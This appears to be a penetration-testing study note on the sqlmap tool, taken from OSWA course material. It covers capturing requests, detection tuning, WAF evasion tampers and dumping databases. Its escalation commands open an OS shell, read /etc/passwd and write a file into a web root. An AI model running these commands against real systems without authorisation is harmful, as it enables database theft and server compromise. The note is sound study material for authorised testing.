---
type: tool
title: sqlmap
lang: en
status: active
wstg: []
owasp_top10: ["A03:2021"]
cwe: ["CWE-89"]
sources: [web-200-oswa]
updated: 2026-07-31
---

# sqlmap

Automated [[sql-injection]] detection and exploitation. Best driven from a **real request**
captured in [[burp-suite|Burp]] (so cookies/headers/body match), not a hand-typed URL.
Preinstalled on Kali.

## Point it at a request

```bash
sqlmap -r request.txt -p 'order[0][dir]'      # request saved from Burp; target one param
sqlmap -u 'https://app/item?id=1' --cookie='SESSION=...'   # or a URL directly
sqlmap ... --dbms=mysql --batch               # skip prompts, hint the DBMS
sqlmap ... --proxy=http://127.0.0.1:8080      # route through Burp to watch traffic
```

## Tune detection

```bash
--level=5 --risk=3          # deeper/heavier tests (more payloads, more places)
--technique=E               # restrict to Error-based (B U E S T Q); useful when you
                            #   already know the context (e.g. ORDER BY → not U)
--tamper=space2comment      # WAF evasion transforms
```

## Enumerate & dump

```bash
--current-user --current-db --is-dba
--dbs                                   # list databases
--tables -D app                         # tables in a db
--columns -T users -D app               # columns
--dump  -T users -D app                 # dump a table
--dump-all --exclude-sysdbs             # everything non-system
```

## Escalate

```bash
--os-shell        # attempt an interactive OS shell (writes a stager; needs privileges)
--sql-shell       # interactive SQL prompt
--file-read=/etc/passwd   --file-write=local --file-dest=/var/www/html/x
```

## Mapping & limits

- Implements every method on [[sql-injection]] (UNION/error/boolean/time/stacked) plus the
  [[sql-enumeration]] ladder, automatically.
- **Limits:** noisy (fires many payloads — bad for stealth); can miss context-specific
  injections that need manual insight (the `ORDER BY` case is a good example of "confirm by
  hand first"); WAFs may block it. Know the manual payload before reaching for `--dump`.

*Source: [[web-200-oswa]] module 9.4 (SQLMap).*
